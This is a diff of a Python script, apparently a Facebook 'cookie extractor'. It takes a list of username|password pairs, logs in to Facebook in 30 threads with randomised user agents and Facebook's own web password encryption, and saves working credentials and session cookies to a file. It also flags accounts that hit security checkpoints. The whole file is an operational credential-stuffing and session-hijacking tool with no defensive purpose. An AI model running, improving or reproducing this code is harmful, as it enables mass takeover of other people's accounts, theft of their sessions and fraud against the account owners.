@@ -1,114 +1,148 @@
-import re, random, string, os, sys
-from os import system as run
+import re, os, sys, base64, struct, datetime, binascii
+from cookiesparser import encode as encode_cookies
 from time import sleep
-from concurrent.futures import ThreadPoolExecutor as thread
-"""
-Coded By Farhan Ali
-Don't Copy!
-GitHub https://github.com/farhanaliofficial
-"""
-try:
-	import requests
-except:
-	os.system("pip install requests")
+from requests import Session
+from pyrua import get_rua
+from Cryptodome.Cipher import AES
+from Cryptodome import Random
+from nacl.public import PublicKey
+from nacl.public import SealedBox
+from concurrent.futures import ThreadPoolExecutor
 
-import requests
 
-ids = []
-OK = []
-CP = []
-red = "\033[1;31;40m"
-green = "\033[1;32;40m"
-white = "\033[0;37;40m"
-loop = 0
+class FacebookCookieExtractor:
+    def __init__(self):
+        self.ids = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        self.colors = {"r": "\033[1;31;40m", "g": "\033[1;32;40m", "w": "\033[0;37;40m"}
 
-def get_ua():
-	return f"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S{random.randrange(100, 9999)}/{random.randrange(100, 9999)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.choice(string.ascii_uppercase)}{random.randrange(1, 9)}; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/{random.randrange(1, 9)}.{random.randrange(1, 9)} Mobile WVGA SMM-MMS/1.2.0 OPN-B"
+    def clear_screen(self):
+        os.system("cls" if "nt" in os.name else "clear")
 
-def logo():
-	global green, white
-	print(f"""    ______            __   _
+    def get_term_size(self):
+        return os.get_terminal_size()[0]
+    
+    def display_logo(self):
+        c = self.colors
+        print(f"""    ______            __   _
    / ____/___  ____  / /__(_)__  _____
-  / /   / __ \/ __ \/ //_/ / _ \/ ___/
+  / /   / __ \\/ __ \\/ //_/ / _ \\/ ___/
  / /___/ /_/ / /_/ / ,< / /  __(__  )
- \____/\____/\____/_/|_/_/\___/____/
- {green}Coded By Farhan Ali
- @farhanakiofficial{white}""")
-	print("-"*40)
+ \\____/\\____/\\____/_/|_/_/\\___/____/
+ {c['g']}Coded By Farhan Ali
+ @farhaanaliii{c['w']}
+{"-" * self.get_term_size()}
+""")
 
-def main():
-	global ids, OK, CP, red, green, white, loop
-	ids.clear()
-	OK.clear()
-	CP.clear()
-	loop = loop * 0
-	run("clear")
-	logo()
-	file_name = input(f" [{green}+{white}] Enter File Name{green}:{white} ")
-	try:
-		ids.extend(open(file_name,"r").read().splitlines())
-	except Exception as e:
-		print(f" [{red}X{white}] {str(e)}")
-		sleep(.8)
-		main()
-	with thread(max_workers=30) as FarhanAli:
-		for id in ids:
-			FarhanAli.submit(_Cookies,id)
-	
-	print("-"*40)
-	print(f" Process Completed\n Cookies are Saved in Cookies.txt{green}!{white}")
-	input(" Press Enter to Continue")
-	main()
+    def start(self):
+        self.ids.clear()
+        self.ok.clear()
+        self.cp.clear()
+        self.loop = 0
+        self.clear_screen()
+        self.display_logo()
 
-def getCookies(uid,password):
-	session = requests.Session()
-	_ua = get_ua()
-	_fb = session.get('https://m.facebook.com').text
-	_data = {
-		"lsd": re.search('name="lsd" value="(.*?)"', str(_fb)).group(1),
-		"jazoest": re.search('name="jazoest" value="(.*?)"', str(_fb)).group(1),
-		"m_ts": re.search('name="m_ts" value="(.*?)"', str(_fb)).group(1),
-		"li": re.search('name="li" value="(.*?)"', str(_fb)).group(1),
-		"try_number":"0",
-		"unrecognized_tries":"0",
-		"email": uid,
-		"pass": password,
-		"login": "Log In"
-	}
-	_header = {
-		'authority': 'p.facebook.com',
-		'upgrade-insecure-requests': '1',
-		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-		'accept-language': 'en-PK,en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7', 
-		'dnt': '1', 
-		'x-requested-with': 'mark.via.gp', 
-		'sec-fetch-site': 'none',
-		'sec-fetch-mode': 'navigate',
-		'sec-fetch-user': '?1',
-		'sec-fetch-dest': 'document',
-		'accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-		'cache-control': 'max-age=0',
-		'user-agent': _ua
-	}
-	_res = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=_data,headers=_header).text
-	cookies = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-	return cookies
+        file_name = input(f" [{self.colored("g", "+")}] Enter File Name: ")
+        try:
+            with open(file_name, "r") as file:
+                self.ids.extend(file.read().splitlines())
+        except Exception as e:
+            print(f" [{self.colored("r", "X")}] {str(e)}")
+            sleep(1)
+            self.start()
 
-def _Cookies(id):
-	global red, green, white, ids, OK, CP, loop
-	uid,psw = id.split("|")
-	try:
-		sys.stdout.write(f'\r %s[%sCOOKIES%s]%s %s%s|%s%s %sOK%s|%sCP %s%s|%s%s%s\r'%(green,white,green,white,loop,green,white,len(ids),white,green,white,len(OK),green,white,len(CP),white));sys.stdout.flush()
-		_cookies = getCookies(uid,psw)
-		if "c_user" in _cookies:
-			print(f" [{green}OK{white}] {uid} {green}|{white} {psw}\n [{green}Cookies{white}] {_cookies}")
-			open("Cookies.txt","a").write(uid+"|"+psw+"|"+_cookies+"\n\n")
-		elif "checkpoint" in _cookies:
-			print(f" [{red}CP{white}] {uid} {red}|{white} {psw}")
-		else:
-			pass
-		loop += 1
-	except:
-		pass
+        with ThreadPoolExecutor(max_workers=30) as executor:
+            for id in self.ids:
+                executor.submit(self.process, id)
+
+        print("-" * self.get_term_size())
+        print(f" Process Completed\n Cookies saved in Cookies.txt{self.colors['g']}!{self.colors['w']}")
+        input(" Press Enter to continue")
+        self.start()
+
+    def facebook_web_encrypt_password(self, key_id, pub_key, password, version=5):
+        key = Random.get_random_bytes(32)
+        iv = bytes([0] * 12)
+        timestamp = int(datetime.datetime.now().timestamp())
+
+        aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
+        aes.update(str(timestamp).encode('utf-8'))
+        encrypted_password, cipher_tag = aes.encrypt_and_digest(password.encode('utf-8'))
+
+        pub_key_bytes = binascii.unhexlify(pub_key)
+        seal_box = SealedBox(PublicKey(pub_key_bytes))
+        encrypted_key = seal_box.encrypt(key)
+
+        encrypted = bytes([1, key_id, *list(struct.pack('<h', len(encrypted_key))), *list(encrypted_key), *list(cipher_tag), *list(encrypted_password)])
+        encrypted = base64.b64encode(encrypted).decode('utf-8')
+
+        return f'#PWD_BROWSER:{version}:{timestamp}:{encrypted}'
+
+    def get_cookies(self, uid, password):
+        session = Session()
+        session.headers.update({
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-GB,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.facebook.com',
+            'priority': 'u=0, i',
+            'referer': 'https://www.facebook.com/',
+            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': get_rua(),
+        })
+        resp = session.get('https://www.facebook.com/login/').text
+
+        matches = re.search(r'\"pubKey\":{"publicKey":"(.+?)","keyId":(\d+?)}}', resp)
+        public_key = matches[1]
+        key_id = int(matches[2])
+
+        data = {
+            "lsd": re.search('name="lsd" value="(.*?)"', resp).group(1),
+            "jazoest": re.search('name="jazoest" value="(.*?)"', resp).group(1),
+            "login_source": "comet_headerless_login",
+            "email": uid,
+            "encpass": self.facebook_web_encrypt_password(key_id, public_key, password)
+        }
+        
+        privacy_token = re.search(r'privacy_mutation_token=([^&]+)', resp)
+        
+        resp = session.post(f'https://www.facebook.com/login/?privacy_mutation_token={privacy_token}', data=data).text
+        return encode_cookies(session.cookies.get_dict())
+    
+    def colored(self, color, text):
+        return f"{self.colors[color]}{text}{self.colors["w"]}"
+    
+    def process(self, id):
+        uid, psw = id.split("|")
+        try:
+            sys.stdout.write(f'\r Processed{self.colored("g", "|")}Total {self.loop}{self.colored("g", "|")}{len(self.ids)} OK{self.colored("g", "|")}CP {len(self.ok)}{self.colored("g", "|")}{len(self.cp)}\r')
+            sys.stdout.flush()
+
+            cookies = self.get_cookies(uid, psw)
+            if "c_user" in cookies:
+                print(f" [{self.colored("g", "OK")}] {uid} | {psw}\n [{self.colors['g']}Cookies{self.colors['w']}] {cookies}")
+                with open("Cookies.txt", "a") as file:
+                    file.write(f"{uid}|{psw}|{cookies}\n")
+                self.ok.append(uid)
+            elif "checkpoint" in cookies:
+                print(f" [{self.colored("r", "CP")}] {uid} | {psw}")
+                self.cp.append(uid)
+            else:
+                print(f" [{self.colored("r", "Invalid")}] {uid} | {psw}")
+            self.loop += 1
+        except Exception as e:
+            print(e)
+
+
 if __name__ == "__main__":
-	main()
+    FacebookCookieExtractor().start()
